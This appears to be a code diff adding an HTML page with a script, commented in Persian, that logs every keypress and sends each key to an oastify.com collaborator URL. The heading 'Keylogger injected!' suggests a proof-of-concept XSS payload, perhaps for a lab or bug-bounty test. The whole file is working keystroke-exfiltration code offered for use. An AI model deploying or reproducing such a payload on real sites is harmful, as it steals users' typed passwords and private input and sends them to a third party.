@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>✅ Keylogger injected!</h3>
+    <script>
+      // 👇 آدرس سرور شما برای دریافت کلیدهای فشرده‌شده (مثلاً از OASTify یا Burp Collaborator)
+      const exfilUrl = "https://s4xui6rilmhsyezhlxsvd3udk4qvem6av.oastify.com/log";
+
+      // این تابع با هر بار فشردن یک کلید اجرا می‌شود
+      document.addEventListener("keydown", function (e) {
+        fetch(`${exfilUrl}?key=${encodeURIComponent(e.key)}`);
+      });
+    </script>
+  </body>
+</html>
